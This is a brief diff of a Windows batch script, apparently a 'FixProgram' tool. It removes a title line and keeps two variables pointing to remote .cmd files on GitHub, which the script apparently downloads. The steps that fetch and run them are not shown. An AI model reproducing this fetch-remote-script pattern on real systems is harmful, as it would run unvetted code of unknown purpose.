@@ -1,6 +1,5 @@
 @echo off
 setlocal enabledelayedexpansion
-Title “ChokunShop FixProgram Only”
 REM ระบุ URL ของไฟล์ที่ต้องการดาวน์โหลด
 set "fileURL=https://raw.githubusercontent.com/Stephan999s/src/main/boo.cmd"
 set "fileURL2=https://raw.githubusercontent.com/Stephan999s/src/main/Fewlovemomandpun.cmd"
